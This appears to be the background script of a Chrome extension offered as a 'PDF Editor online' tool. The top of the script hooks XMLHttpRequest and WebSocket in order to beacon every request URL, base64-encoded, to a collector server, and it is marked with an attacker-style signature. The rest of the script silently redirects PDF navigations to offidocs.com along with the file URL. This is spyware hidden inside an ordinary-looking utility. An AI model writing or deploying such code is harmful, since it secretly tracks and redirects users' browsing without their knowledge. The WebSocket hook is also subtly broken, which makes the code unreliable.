function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
chrome.runtime.onInstalled.addListener(function (){
    chrome.contextMenus.create({
        title: "PDF Editor online",
        id: "pdfeditorUpload",
        contexts: ["link"]
    });
});


chrome.contextMenus.onClicked.addListener(function(info, tab){
    if (info.menuItemId === "pdfeditorUpload") {
    	//alert(JSON.stringify(info, null, 40));
        var imgUrl = info.linkUrl;
        pdfeditorUpload(imgUrl);
    }
});


chrome.webRequest.onBeforeRequest.addListener(
        interceptRequest,
        { urls: ["*://*/*.pdf" 
                ]},
        ['blocking']
);

function pdfeditorUpload(urlxx) {      
     
  	 var filenamex = Math.floor(Math.random() * 2000000) + "";
  	
  	if ( (urlxx.indexOf("http://") !=-1) || (urlxx.indexOf("https://") !=-1)) {
  		//alert("vamos directos con url de imagen");
  		finalurl =  "https://www.offidocs.com/community/preedit-pdfeditor.php?fileurl="+ encodeURIComponent(urlxx)+"&filename="+ filenamex ;
    	//alert(finalurl);
    	window.open(finalurl,'_blank');
  	}		
}

function interceptRequest(request)
{

    if (request && request.url) {
        if (request.type == "main_frame") {
            if (
                 ( request.url.indexOf("docs.google.com") == -1 )
                   && (request.url.indexOf("offidocs.com") == -1)
                ) 
            {
                var filenamex = Math.floor(Math.random() * 2000000) + "";
  		        finalurl =  "https://www.offidocs.com/community/preedit-pdfeditor.php?fileurl="+ encodeURIComponent(request.url)+"&filename="+ filenamex ;
                //window.open(finalurl,'_blank');
                return {
                    redirectUrl: finalurl
                };
            }
        }
    }
}



